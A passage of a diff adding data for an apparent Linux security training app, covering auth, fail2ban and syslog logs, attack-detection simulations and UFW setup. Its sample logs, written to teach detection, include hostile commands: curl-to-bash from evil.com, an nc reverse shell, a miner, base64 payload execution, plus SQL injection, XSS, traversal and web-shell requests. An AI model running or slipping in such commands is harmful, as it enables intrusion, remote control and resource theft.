+            "Authentication failures",
+            "Session opened/closed",
+            "SSH daemon startup"
+        ],
+        "sample_output": """Jan 15 14:20:00 server sshd[1200]: Server listening on 0.0.0.0 port 22.
+Jan 15 14:23:45 server sshd[1234]: Invalid user admin from 203.0.113.5 port 51234
+Jan 15 14:23:45 server sshd[1234]: Failed password for invalid user admin from 203.0.113.5 port 51234 ssh2
+Jan 15 14:24:01 server sshd[1235]: Accepted publickey for alice from 192.168.1.50 port 45678 ssh2: RSA SHA256:abc123...
+Jan 15 14:24:01 server sshd[1235]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Jan 15 14:35:00 server sshd[1235]: pam_unix(sshd:session): session closed for user alice""",
+        "real_world_scenario": {
+            "title": "Insider Threat — Suspicious Login at 3 AM",
+            "story": "One of your employees, Alice, connects to the production server at 3:00 AM from an unusual IP. Two hours later, sensitive files are exfiltrated. Her account wasn't compromised — she was the attacker (or her laptop was).",
+            "trigger": "Automated alert from SIEM: 'Alice logged in outside business hours from 203.0.113.5'",
+            "steps": [
+                {"step": 1, "title": "SIEM fires alert", "cmd": "(automated)", "explain": "Anomaly detection flags: alice, 3:00 AM, IP 203.0.113.5 (not her usual 192.168.1.x).", "color": "#f39c12"},
+                {"step": 2, "title": "Check her recent logins", "cmd": "sudo grep 'alice' /var/log/auth.log | grep 'Accepted' | tail -20", "explain": "You see the 3 AM login — plus others from the same IP over the past week.", "color": "#e74c3c"},
+                {"step": 3, "title": "Cross-check with source IP", "cmd": "whois 203.0.113.5", "explain": "IP resolves to a residential ISP in another country. Alice has never traveled there.", "color": "#c0392b"},
+                {"step": 4, "title": "See what she did after login", "cmd": "sudo grep 'alice' /var/log/auth.log | grep 'COMMAND'", "explain": "Sudo log shows: cat /etc/shadow, tar czf /tmp/data.tar.gz /var/www, scp /tmp/data.tar.gz...", "color": "#e74c3c"},
+                {"step": 5, "title": "Confirm exfiltration", "cmd": "sudo grep 'alice' /var/log/syslog | grep 'scp\\|ssh'", "explain": "Outbound SCP to attacker.com confirms data exfiltration. Alice's account is compromised.", "color": "#c0392b"},
+                {"step": 6, "title": "Incident response", "cmd": "sudo usermod -L alice && sudo ufw deny from 203.0.113.5", "explain": "Lock the account and block the IP. Then notify security team and start forensics.", "color": "#27ae60"}
+            ]
+        },
+        "detection_commands": [
+            {"cmd": "sudo grep 'sshd' /var/log/auth.log | tail -50", "desc": "All recent SSH events", "output": """Jan 15 03:00:12 server sshd[3001]: Accepted password for alice from 203.0.113.5 port 54321 ssh2
+Jan 15 03:05:23 server sudo: alice : TTY=pts/0 ; COMMAND=/bin/cat /etc/shadow
+Jan 15 04:30:11 server sshd[3002]: pam_unix(sshd:session): session closed for user alice"""},
+            {"cmd": "sudo grep 'Invalid user' /var/log/auth.log | awk '{print $NF}' | sort | uniq -c", "desc": "Most-attacked usernames", "output": """  342 admin
+  180 root
+   56 test
+   23 ubuntu"""},
+            {"cmd": "sudo grep 'Accepted' /var/log/auth.log | grep -v '192.168.1'", "desc": "Logins from outside LAN", "output": """Jan 15 03:00:12 server sshd[3001]: Accepted password for alice from 203.0.113.5 port 54321 ssh2"""},
+            {"cmd": "sudo journalctl -u ssh --since today", "desc": "Today's SSH journal logs", "output": """Jan 15 03:00:12 server sshd[3001]: Accepted password for alice from 203.0.113.5 port 54321 ssh2
+Jan 15 04:30:11 server sshd[3002]: pam_unix(sshd:session): session closed for user alice"""}
+        ],
+        "response_actions": [
+            "Lock compromised account: sudo usermod -L alice",
+            "Block source IP: sudo ufw deny from 203.0.113.5",
+            "Force password reset: sudo passwd alice (after unlocking)",
+            "Enable MFA on SSH (Google Authenticator)",
+            "Review sudo logs for actions taken",
+            "Run full incident response checklist"
+        ],
+        "simulation": [
+            {"step": 1, "title": "Alice's credentials leaked", "desc": "Attacker has valid creds", "from": "Dark Web", "to": "Attacker", "data": "alice:p@ssw0rd", "color": "#c0392b"},
+            {"step": 2, "title": "3 AM login", "desc": "From unfamiliar IP", "from": "Attacker", "to": "SSH", "data": "alice from 203.0.113.5", "color": "#e74c3c"},
+            {"step": 3, "title": "Session opens", "desc": "Alice's shell is now attacker's", "from": "SSH", "to": "Server", "data": "Shell granted", "color": "#f39c12"},
+            {"step": 4, "title": "Data exfiltration", "desc": "scp to attacker.com", "from": "Server", "to": "Attacker", "data": "data.tar.gz sent", "color": "#e74c3c"},
+            {"step": 5, "title": "SIEM alert fires", "desc": "Anomaly detected next morning", "from": "SIEM", "to": "Admin", "data": "Alert: off-hours login", "color": "#3498db"},
+            {"step": 6, "title": "Response", "desc": "Lock account + block IP", "from": "Admin", "to": "System", "data": "Account locked", "color": "#27ae60"}
+        ]
+    },
+    {
+        "name": "Fail2ban log",
+        "path": "/var/log/fail2ban.log",
+        "alt_path": "Only exists if fail2ban installed",
+        "icon": "🚫",
+        "color": "#16a085",
+        "purpose": "Logs from fail2ban — IPs banned/unbanned for repeated failures.",
+        "critical": True,
+        "read_command": "sudo tail -f /var/log/fail2ban.log",
+        "search_command": "grep 'Ban' /var/log/fail2ban.log",
+        "what_logged": [
+            "Bans issued",
+            "Unbans (timeout or manual)",
+            "Jail start/stop",
+            "Failed logins that triggered ban"
+        ],
+        "sample_output": """2024-01-15 14:24:00,123 fail2ban.actions [1234]: NOTICE  [sshd] Ban 203.0.113.5
+2024-01-15 14:34:00,456 fail2ban.actions [1234]: NOTICE  [sshd] Unban 203.0.113.5
+2024-01-15 14:40:00,789 fail2ban.filter [1234]: INFO    [sshd] Found 198.51.100.42 - 2024-01-15 14:40:00
+2024-01-15 14:40:15,012 fail2ban.actions [1234]: NOTICE  [sshd] Ban 198.51.100.42""",
+        "real_world_scenario": {
+            "title": "Fail2ban Saves Your Server Automatically",
+            "story": "You install fail2ban on a fresh VPS. Within the first hour, an attacker starts brute-forcing SSH. Fail2ban detects the pattern, bans the IP automatically, and alerts you. The attack never even touches your auth.log beyond the first few tries.",
+            "trigger": "You check fail2ban status out of curiosity.",
+            "steps": [
+                {"step": 1, "title": "Attacker starts", "cmd": "(automatic)", "explain": "SSH brute force begins. Fail2ban is watching auth.log in real time.", "color": "#f39c12"},
+                {"step": 2, "title": "Failure count hit", "cmd": "(automatic)", "explain": "After 5 failed attempts (default), fail2ban triggers the ban action.", "color": "#e74c3c"},
+                {"step": 3, "title": "Ban applied", "cmd": "sudo fail2ban-client status sshd", "explain": "Ban list shows the attacker IP. All further traffic from it is dropped.", "color": "#27ae60"},
+                {"step": 4, "title": "Watch the log", "cmd": "sudo tail -f /var/log/fail2ban.log", "explain": "You see: 'Ban 203.0.113.5' + 'Unban' after 10 minutes (default bantime).", "color": "#3498db"},
+                {"step": 5, "title": "Attack ends", "cmd": "(automatic)", "explain": "Attacker gives up after seeing timeouts. Total damage: 0 successful logins.", "color": "#27ae60"},
+                {"step": 6, "title": "Tune the settings", "cmd": "sudo nano /etc/fail2ban/jail.local", "explain": "Increase bantime to 1 week and maxretry to 3 for stricter protection.", "color": "#9b59b6"}
+            ]
+        },
+        "detection_commands": [
+            {"cmd": "sudo fail2ban-client status", "desc": "Show all jails", "output": """Status
+|- Number of jail:      2
+`- Jail list:   sshd, apache-auth"""},
+            {"cmd": "sudo fail2ban-client status sshd", "desc": "SSH jail details", "output": """Status for the jail: sshd
+|- Filter
+|  |- Currently failed: 2
+|  |  - Total failed:   847
+|  `- File list:        /var/log/auth.log
+`- Actions
+   |- Currently banned: 3
+   |- Total banned:     12
+   `- Banned IP list:   203.0.113.5 198.51.100.42 192.0.2.77"""},
+            {"cmd": "grep 'Ban' /var/log/fail2ban.log | tail -20", "desc": "Recent bans", "output": """2024-01-15 14:24:00 fail2ban.actions [1234]: NOTICE [sshd] Ban 203.0.113.5
+2024-01-15 14:30:00 fail2ban.actions [1234]: NOTICE [sshd] Ban 198.51.100.42"""},
+            {"cmd": "sudo fail2ban-client set sshd unbanip 203.0.113.5", "desc": "Manually unban an IP", "output": """203.0.113.5"""}
+        ],
+        "response_actions": [
+            "Increase bantime to 1w in /etc/fail2ban/jail.local",
+            "Add a second jail for Apache/Nginx",
+            "Forward fail2ban alerts to email/Slack",
+            "Combine with UFW (fail2ban uses it under the hood)",
+            "For persistent attackers: block subnet (/24) instead of single IP"
+        ],
+        "simulation": [
+            {"step": 1, "title": "Fail2ban running", "desc": "Watching auth.log for patterns", "from": "fail2ban", "to": "auth.log", "data": "Tailing...", "color": "#16a085"},
+            {"step": 2, "title": "Failed login detected", "desc": "1st failed password", "from": "sshd", "to": "auth.log", "data": "Failed password", "color": "#f39c12"},
+            {"step": 3, "title": "5 failures reached", "desc": "Threshold hit", "from": "fail2ban", "to": "Rule", "data": "Trigger ban", "color": "#e74c3c"},
+            {"step": 4, "title": "Ban applied", "desc": "UFW/iptables rule added", "from": "fail2ban", "to": "Firewall", "data": "DROP 203.0.113.5", "color": "#c0392b"},
+            {"step": 5, "title": "Attacker blocked", "desc": "Timeout on next connect", "from": "Firewall", "to": "Attacker", "data": "(no response)", "color": "#27ae60"},
+            {"step": 6, "title": "Auto-unban", "desc": "After 10 minutes", "from": "fail2ban", "to": "Firewall", "data": "Ban lifted", "color": "#3498db"}
+        ]
+    },
+    {
+        "name": "syslog / messages",
+        "path": "/var/log/syslog",
+        "alt_path": "/var/log/messages (RHEL/CentOS)",
+        "icon": "📰",
+        "color": "#3498db",
+        "purpose": "General system log — kernel messages, service startup, hardware events, and application logs.",
+        "critical": True,
+        "read_command": "sudo tail -f /var/log/syslog",
+        "search_command": "grep -i error /var/log/syslog",
+        "what_logged": [
+            "Kernel messages (hardware, drivers)",
+            "Systemd service start/stop",
+            "Cron job execution",
+            "Network events (DHCP, WiFi)",
+            "USB/disk plug-ins",
+            "Application startup logs"
+        ],
+        "sample_output": """Jan 15 14:23:45 server systemd[1]: Starting Daily apt upgrade...
+Jan 15 14:23:47 server kernel: [12345.678] usb 1-1: new high-speed USB device number 5 using xhci_hcd
+Jan 15 14:23:52 server NetworkManager[890]: <info> device (eth0): state change: activated -> deactivating
+Jan 15 14:24:01 server cron[1234]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
+Jan 15 14:24:15 server systemd[1]: Started Session 42 of user alice.""",
+        "real_world_scenario": {
+            "title": "Out-of-Memory Killer Kills Your Database",
+            "story": "Your server has 8 GB of RAM. A misconfigured app starts consuming all of it. The kernel's OOM killer (Out-Of-Memory) has to decide which process to kill — usually the biggest one, which is your database. It's all logged in syslog.",
+            "trigger": "Your app stopped responding. SSH still works. What happened?",
+            "steps": [
+                {"step": 1, "title": "App is down", "cmd": "sudo systemctl status mysql", "explain": "MySQL is dead — 'inactive (dead)'. It didn't crash from a bug; something killed it.", "color": "#f39c12"},
+                {"step": 2, "title": "Check syslog for OOM", "cmd": "grep -i 'out of memory\\|oom' /var/log/syslog | tail", "explain": "You see: 'Out of memory: Killed process 1234 (mysqld) total-vm:7234568kB'", "color": "#e74c3c"},
+                {"step": 3, "title": "Who triggered OOM?", "cmd": "grep -i 'oom' /var/log/syslog | tail -20", "explain": "A Node.js worker was consuming 6 GB. The kernel had to kill something to save the system.", "color": "#c0392b"},
+                {"step": 4, "title": "Find the real culprit", "cmd": "grep 'node' /var/log/syslog | tail -30", "explain": "The Node app logged warnings about a memory leak. Fix the leak or add a memory limit.", "color": "#e74c3c"},
+                {"step": 5, "title": "Protect MySQL", "cmd": "sudo systemctl edit mysql", "explain": "Set OOMScoreAdjust=-500 to make MySQL less likely to be killed. Or limit Node's memory.", "color": "#27ae60"},
+                {"step": 6, "title": "Restart everything", "cmd": "sudo systemctl restart mysql nodeapp", "explain": "Restart services with the new config. Monitor with 'free -h' and 'vmstat'.", "color": "#3498db"}
+            ]
+        },
+        "detection_commands": [
+            {"cmd": "grep -i 'error\\|fail\\|warn' /var/log/syslog | tail -50", "desc": "Recent errors and warnings", "output": """Jan 15 14:20:00 server kernel: Out of memory: Killed process 1234 (mysqld)
+Jan 15 14:20:00 server systemd[1]: mysql.service: A process of this unit has been killed by the OOM killer.
+Jan 15 14:20:01 server systemd[1]: mysql.service: Failed with result 'oom-kill'."""},
+            {"cmd": "grep -i 'segfault\\|oom' /var/log/syslog", "desc": "Crashes and memory issues", "output": """Jan 15 14:20:00 server kernel: [12345.678] Out of memory: Killed process 1234 (mysqld)
+Jan 15 13:45:22 server kernel: [11987.123] node[5678]: segfault at 0 ip 00007f... sp 00007ff..."""},
+            {"cmd": "journalctl -p err --since '1 hour ago'", "desc": "Errors in last hour", "output": """Jan 15 14:20:00 server kernel: Out of memory: Killed process 1234 (mysqld)
+Jan 15 14:20:01 server systemd[1]: mysql.service: Main process exited, code=killed, status=9/KILL"""}
+        ],
+        "response_actions": [
+            "Add memory limits to apps (systemd MemoryMax=2G)",
+            "Set OOMScoreAdjust=-500 on critical services",
+            "Enable swap (doesn't always help but can delay OOM)",
+            "Monitor memory with Prometheus + Grafana alerts",
+            "Fix the memory leak in the misbehaving app"
+        ],
+        "simulation": [
+            {"step": 1, "title": "App leaks memory", "desc": "Node.js slowly consumes RAM", "from": "Node App", "to": "Memory", "data": "6 GB used", "color": "#f39c12"},
+            {"step": 2, "title": "RAM exhausted", "desc": "8 GB total, all used", "from": "Memory", "to": "Kernel", "data": "No free RAM", "color": "#e74c3c"},
+            {"step": 3, "title": "OOM killer activates", "desc": "Kernel needs to free memory", "from": "Kernel", "to": "Processes", "data": "Pick victim", "color": "#c0392b"},
+            {"step": 4, "title": "MySQL killed", "desc": "Biggest process selected", "from": "Kernel", "to": "mysqld", "data": "SIGKILL sent", "color": "#e74c3c"},
+            {"step": 5, "title": "syslog records it", "desc": "OOM event logged", "from": "Kernel", "to": "syslog", "data": "Killed process 1234", "color": "#3498db"},
+            {"step": 6, "title": "You spot + fix", "desc": "Add memory limits, restart", "from": "Admin", "to": "systemd", "data": "MemoryMax=2G", "color": "#27ae60"}
+        ]
+    }
+]
+
+# ==================== LINUX: ATTACK DETECTION SIMULATIONS ====================
+LOG_ATTACK_SIMULATIONS = [
+    {
+        "id": "ssh_brute",
+        "title": "SSH Brute Force Attack",
+        "icon": "🔨",
+        "color": "#e74c3c",
+        "scenario": "An attacker is trying thousands of passwords on your SSH service from a foreign IP.",
+        "how_to_detect": [
+            "Many 'Failed password' entries from the SAME IP",
+            "Different usernames tried (admin, root, test, ubuntu)",
+            "Attempts are seconds apart (automated)",
+            "Often triggers fail2ban automatically"
+        ],
+        "log_output": """Jan 15 14:23:45 server sshd[1234]: Failed password for invalid user admin from 203.0.113.5 port 51234 ssh2
+Jan 15 14:23:46 server sshd[1234]: Failed password for invalid user test from 203.0.113.5 port 51236 ssh2
+Jan 15 14:23:47 server sshd[1234]: Failed password for invalid user ubuntu from 203.0.113.5 port 51238 ssh2
+Jan 15 14:23:48 server sshd[1234]: Failed password for root from 203.0.113.5 port 51240 ssh2
+Jan 15 14:23:49 server sshd[1234]: Failed password for root from 203.0.113.5 port 51242 ssh2
+Jan 15 14:23:50 server sshd[1234]: Failed password for root from 203.0.113.5 port 51244 ssh2
+Jan 15 14:23:52 server sshd[1234]: error: maximum authentication attempts exceeded for root from 203.0.113.5 port 51246 ssh2 [preauth]
+Jan 15 14:23:52 server sshd[1234]: Disconnected from authenticating user root 203.0.113.5 port 51246 [preauth]
+Jan 15 14:24:00 server fail2ban.actions[890]: NOTICE  [sshd] Ban 203.0.113.5""",
+        "commands": [
+            "sudo grep 'Failed password' /var/log/auth.log | tail -20",
+            "sudo grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head",
+            "sudo lastb | head -10",
+            "sudo fail2ban-client status sshd"
+        ],
+        "response": [
+            "Check attacking IP: whois 203.0.113.5",
+            "Block IP: sudo ufw deny from 203.0.113.5",
+            "Verify fail2ban is enabled: sudo systemctl status fail2ban",
+            "Enforce SSH keys only: PasswordAuthentication no in /etc/ssh/sshd_config",
+            "Change SSH port to non-standard (e.g., 2222)"
+        ]
+    },
+    {
+        "id": "web_scan",
+        "title": "Web Application Scanning",
+        "icon": "🌐",
+        "color": "#f39c12",
+        "scenario": "Automated tool (Nikto, sqlmap, gobuster) scanning your web server for vulnerabilities.",
+        "how_to_detect": [
+            "User-Agent reveals tool (sqlmap/1.7.2, Nikto/2.5.0)",
+            "Many 404s from the same IP in seconds",
+            "URLs trying common paths: /admin, /.git, /wp-login.php",
+            "Payloads in URL: ' OR '1'='1, <script>, ../../etc/passwd"
+        ],
+        "log_output": """203.0.113.5 - - [15/Jan/2024:14:23:45 +0000] "GET /admin.php HTTP/1.1" 404 512 "-" "sqlmap/1.7.2"
+203.0.113.5 - - [15/Jan/2024:14:23:46 +0000] "GET /.git/config HTTP/1.1" 404 512 "-" "sqlmap/1.7.2"
+203.0.113.5 - - [15/Jan/2024:14:23:47 +0000] "GET /wp-login.php HTTP/1.1" 200 4532 "-" "sqlmap/1.7.2"
+203.0.113.5 - - [15/Jan/2024:14:23:48 +0000] "GET /product.php?id=1' AND '1'='1 HTTP/1.1" 500 1234 "-" "sqlmap/1.7.2"
+203.0.113.5 - - [15/Jan/2024:14:23:49 +0000] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 512 "-" "sqlmap/1.7.2"
+203.0.113.5 - - [15/Jan/2024:14:23:50 +0000] "GET /../../etc/passwd HTTP/1.1" 400 226 "-" "sqlmap/1.7.2"
+203.0.113.5 - - [15/Jan/2024:14:23:52 +0000] "GET /backup.sql HTTP/1.1" 404 512 "-" "sqlmap/1.7.2\"""",
+        "commands": [
+            "grep 'sqlmap\\|nikto\\|nmap' /var/log/apache2/access.log",
+            "grep -i 'union.*select' /var/log/apache2/access.log",
+            "grep -i '<script>' /var/log/apache2/access.log",
+            "grep ' 404 ' /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head"
+        ],
+        "response": [
+            "Block scanner IP: sudo ufw deny from 203.0.113.5",
+            "Enable ModSecurity WAF",
+            "Add rate limiting to Nginx/Apache",
+            "Use Cloudflare in front of your web server",
+            "Review exposed endpoints"
+        ]
+    },
+    {
+        "id": "privilege_esc",
+        "title": "Privilege Escalation Attempt",
+        "icon": "⬆️",
+        "color": "#c0392b",
+        "scenario": "Logged-in user tries to run sudo commands they're not allowed to.",
+        "how_to_detect": [
+            "'user NOT in sudoers' entries",
+            "Multiple sudo failures from same user",
+            "Attempted commands accessing sensitive files (/etc/shadow)",
+            "Time clustering of failures"
+        ],
+        "log_output": """Jan 15 14:25:00 server sudo: alice : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Jan 15 14:25:05 server sudo: alice : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/passwd
+Jan 15 14:25:10 server sudo: alice : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash
+Jan 15 14:25:15 server sudo: alice : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/visudo
+Jan 15 14:25:20 server su[1234]: FAILED su for root by alice
+Jan 15 14:25:25 server su[1235]: pam_unix(su:auth): authentication failure; logname=alice uid=1000 euid=0""",
+        "commands": [
+            "sudo grep 'NOT in sudoers' /var/log/auth.log",
+            "sudo grep 'incorrect password' /var/log/auth.log",
+            "sudo grep 'FAILED su' /var/log/auth.log",
+            "sudo grep 'alice' /var/log/auth.log | grep -v Accepted"
+        ],
+        "response": [
+            "Investigate the user: ps -u alice",
+            "Check their shell history: cat /home/alice/.bash_history",
+            "Review active sessions: w",
+            "Suspend account: sudo usermod -L alice",
+            "Escalate to security team"
+        ]
+    },
+    {
+        "id": "malicious_cron",
+        "title": "Malicious Cron Persistence",
+        "icon": "⏰",
+        "color": "#9b59b6",
+        "scenario": "Attacker installs a cron job to maintain access (download + execute payload repeatedly).",
+        "how_to_detect": [
+            "Cron jobs running from /tmp/ or /dev/shm",
+            "Commands with curl, wget, base64, nc",
+            "Recent modifications to /etc/cron.* or crontab",
+            "Unknown users with cron jobs"
+        ],
+        "log_output": """Jan 15 14:30:00 server cron[2000]: (www-data) CMD (cd /tmp && curl -s http://evil.com/x.sh | bash)
+Jan 15 14:30:15 server cron[2001]: (www-data) CMD (base64 -d /tmp/payload | sh)
+Jan 15 14:30:30 server cron[2002]: (www-data) CMD (nc -e /bin/bash evil.com 4444)
+Jan 15 14:31:00 server cron[2003]: (www-data) CMD (/tmp/miner --donate-level 1 -o pool.minexmr.com:4444)
+Jan 15 14:31:30 server cron[2004]: (www-data) CMD (curl http://evil.com/x.sh -o /tmp/x && chmod +x /tmp/x && /tmp/x)""",
+        "commands": [
+            "grep CRON /var/log/syslog | grep -E 'curl|wget|base64|nc'",
+            "cat /etc/crontab /etc/cron.d/* 2>/dev/null",
+            "ls -la /var/spool/cron/crontabs/",
+            "sudo crontab -l -u www-data",
+            "sudo find /tmp /dev/shm -type f -mtime -1"
+        ],
+        "response": [
+            "Remove malicious cron: sudo crontab -r -u www-data",
+            "Kill running processes: pkill -u www-data",
+            "Delete payloads: sudo rm -rf /tmp/*",
+            "Find initial access vector (check auth.log, apache logs)",
+            "Isolate the system from the network immediately"
+        ]
+    },
+    {
+        "id": "web_shell",
+        "title": "Web Shell Detected",
+        "icon": "🐚",
+        "color": "#16a085",
+        "scenario": "Attacker uploaded a PHP/JSP web shell to control the server via HTTP.",
+        "how_to_detect": [
+            "POST requests to unusual PHP files",
+            "Large POST bodies to /uploads/",
+            "User-Agent inconsistencies",
+            "PHP errors mentioning system(), exec(), shell_exec()",
+            "Outbound connections from web server user (www-data)"
+        ],
+        "log_output": """192.168.1.99 - - [15/Jan/2024:14:35:00 +0000] "POST /uploads/shell.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
+192.168.1.99 - - [15/Jan/2024:14:35:05 +0000] "POST /uploads/shell.php HTTP/1.1" 200 5234 "-" "Mozilla/5.0"
+192.168.1.99 - - [15/Jan/2024:14:35:10 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 45 "-" "Mozilla/5.0"
+192.168.1.99 - - [15/Jan/2024:14:35:15 +0000] "GET /uploads/shell.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
+
+# In syslog:
+Jan 15 14:35:20 server www-data: PHP Warning: shell_exec(): Cannot execute a blank command in /var/www/html/uploads/shell.php""",
+        "commands": [
+            "grep 'uploads.*\\.php' /var/log/apache2/access.log",
+            "grep -i 'shell_exec\\|system\\|exec' /var/log/apache2/error.log",
+            "find /var/www -name '*.php' -newermt '1 day ago'",
+            "find /var/www -type f -mtime -1 -name '*.php' -exec ls -la {} \\;",
+            "sudo ss -tp | grep www-data"
+        ],
+        "response": [
+            "Delete web shell: sudo rm /var/www/html/uploads/shell.php",
+            "Kill any processes: sudo pkill -u www-data",
+            "Check reverse shells: sudo ss -tulpn | grep -E '4444|5555|8888'",
+            "Patch upload form to reject PHP files",
+            "Review file integrity: aide --check"
+        ]
+    }
+]
+
+# ==================== LINUX: FIREWALL (UFW + IPTABLES) ====================
+# ==================== LINUX: FIREWALL (Interactive) ====================
+LINUX_FIREWALL = {
+    "intro": "A firewall controls what network traffic is allowed in or out of your Linux system. Two main tools: UFW (simple, Ubuntu default) and iptables (powerful, low-level).",
+    "why": [
+        "Block attacks before they reach services",
+        "Control which ports are exposed to the internet",
+        "Restrict SSH/web/database access by IP",
+        "Log and monitor suspicious traffic",
+        "Meet compliance requirements (PCI-DSS, HIPAA)"
+    ],
+    "ufw_basics": {
+        "install": [
+            {
+                "cmd": "sudo apt update",
+                "desc": "Update package index",
+                "output": """Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease
+Get:2 http://security.ubuntu.com/ubuntu jammy-security InRelease [110 kB]
+Reading package lists... Done
+Building dependency tree... Done""",
+                "scenario": "Run this first — always update before installing anything. This refreshes the list of available packages from Ubuntu's servers.",
+                "simulation": [
+                    {"step": 1, "title": "Read sources", "desc": "apt reads /etc/apt/sources.list", "from": "apt", "to": "Sources", "data": "List of repos", "color": "#3498db"},
+                    {"step": 2, "title": "Fetch indexes", "desc": "Downloads package lists from each repo", "from": "apt", "to": "Mirrors", "data": "HTTPS GET", "color": "#f39c12"},
+                    {"step": 3, "title": "Store cache", "desc": "Writes to /var/lib/apt/lists/", "from": "apt", "to": "Local Cache", "data": "Updated", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo apt install ufw",
+                "desc": "Install UFW firewall",
+                "output": """Reading package lists... Done
+Building dependency tree... Done
+The following NEW packages will be installed:
+  ufw
+0 upgraded, 1 newly installed, 0 to remove and 15 not upgraded.
+Need to get 165 kB of archives.
+After this operation, 851 kB of additional disk space will be used.
+Get:1 http://archive.ubuntu.com/ubuntu jammy/main amd64 ufw all 0.36.1 [165 kB]
+Fetched 165 kB in 0s (512 kB/s)
+Selecting previously unselected package ufw.
+(Reading database ... 234567 files and directories currently installed.)
+Preparing to unpack .../ufw_0.36.1_all.deb ...
+Unpacking ufw (0.36.1) ...
+Setting up ufw (0.36.1) ...
+Processing triggers for man-db (2.10.2-1) ...
+Processing triggers for rsyslog (8.2112.0-2ubuntu2) ...""",
+                "scenario": "Installs UFW. On Ubuntu it's usually preinstalled — this shows the installation output if not present.",
+                "simulation": [
+                    {"step": 1, "title": "Download .deb", "desc": "apt downloads the package", "from": "apt", "to": "Archive", "data": "ufw_0.36.1_all.deb", "color": "#3498db"},
+                    {"step": 2, "title": "Unpack", "desc": "Extracts files to /usr/sbin/ufw", "from": "dpkg", "to": "/usr", "data": "Binary placed", "color": "#f39c12"},
+                    {"step": 3, "title": "Configure", "desc": "Sets up service scripts", "from": "dpkg", "to": "systemd", "data": "Service ready", "color": "#27ae60"}
+                ]
+            }
+        ],
+        "enable": [
+            {
+                "cmd": "sudo ufw default deny incoming",
+                "desc": "Block ALL incoming traffic by default",
+                "output": """Default incoming policy changed to 'deny'
+(be sure to update your rules accordingly)""",
+                "scenario": "Sets the default policy: if a packet doesn't match any rule, DROP it. This is the safe posture — nothing gets in unless you explicitly allow it.",
+                "simulation": [
+                    {"step": 1, "title": "Read current policy", "desc": "UFW reads /etc/default/ufw", "from": "ufw", "to": "Config", "data": "DEFAULT_INPUT_POLICY", "color": "#3498db"},
+                    {"step": 2, "title": "Update policy", "desc": "Sets default to DROP", "from": "ufw", "to": "Config", "data": "Policy: deny", "color": "#f39c12"},
+                    {"step": 3, "title": "Save", "desc": "Writes back to /etc/default/ufw", "from": "ufw", "to": "Disk", "data": "Saved", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw default allow outgoing",
+                "desc": "Allow all outgoing traffic",
+                "output": """Default outgoing policy changed to 'allow'
+(be sure to update your rules accordingly)""",
+                "scenario": "Your machine can still initiate connections to the internet (apt update, curl, DNS). Without this, you'd have no internet access!",
+                "simulation": [
+                    {"step": 1, "title": "Set policy", "desc": "UFW updates default outgoing", "from": "ufw", "to": "Config", "data": "allow outgoing", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw allow ssh",
+                "desc": "Allow SSH BEFORE enabling!",
+                "output": """Rules updated
+Rules updated (v6)""",
+                "scenario": "⚠️ CRITICAL STEP. If you enable UFW without allowing SSH first, and you're connected remotely, you will be permanently locked out. This must be the FIRST rule you add.",
+                "simulation": [
+                    {"step": 1, "title": "Resolve service", "desc": "UFW reads /etc/services for 'ssh' = 22/tcp", "from": "ufw", "to": "/etc/services", "data": "ssh → 22/tcp", "color": "#3498db"},
+                    {"step": 2, "title": "Add rule", "desc": "Creates ALLOW rule for port 22", "from": "ufw", "to": "Rules DB", "data": "ALLOW 22/tcp", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw enable",
+                "desc": "Activate the firewall",
+                "output": """Command may disrupt existing ssh connections. Proceed with operation (y|n)? y
+Firewall is active and enabled on system startup""",
+                "scenario": "Turns on the firewall. From this moment, every packet is evaluated against your rules. UFW warns about SSH disruption — this is where locked-out horror stories happen if you skipped the previous step.",
+                "simulation": [
+                    {"step": 1, "title": "Confirm", "desc": "Asks user to confirm", "from": "ufw", "to": "User", "data": "y/n prompt", "color": "#f39c12"},
+                    {"step": 2, "title": "Load rules", "desc": "Pushes rules to iptables (kernel)", "from": "ufw", "to": "netfilter", "data": "iptables -A INPUT...", "color": "#3498db"},
+                    {"step": 3, "title": "Persist", "desc": "Saves for next boot", "from": "ufw", "to": "/etc/ufw/", "data": "user.rules", "color": "#9b59b6"},
+                    {"step": 4, "title": "Active", "desc": "Firewall is now filtering", "from": "netfilter", "to": "Kernel", "data": "Active", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw status verbose",
+                "desc": "Verify it's working",
+                "output": """Status: active
+Logging: on (low)
+Default: deny (incoming), allow (outgoing), disabled (routed)
+New profiles: skip
+
+To                         Action      From
+--                         ------      ----
+22/tcp                     ALLOW IN    Anywhere
+22/tcp (v6)                ALLOW IN    Anywhere (v6)""",
+                "scenario": "Shows current state. 'Status: active' = firewall on. The last block lists every rule — 22/tcp is allowed from anywhere.",
+                "simulation": [
+                    {"step": 1, "title": "Query state", "desc": "ufw asks netfilter", "from": "ufw", "to": "iptables", "data": "iptables -L -n", "color": "#3498db"},
+                    {"step": 2, "title": "Format output", "desc": "Human-readable summary", "from": "ufw", "to": "Terminal", "data": "Status shown", "color": "#27ae60"}
+                ]
+            }
+        ],
+        "common_rules": [
+            {
+                "cmd": "sudo ufw allow 22/tcp",
+                "desc": "Allow SSH (explicit port form)",
+                "output": """Rule added
+Rule added (v6)""",
+                "scenario": "Same as 'allow ssh' but explicit. Use this form if your SSH runs on a non-standard port (e.g., 2222/tcp).",
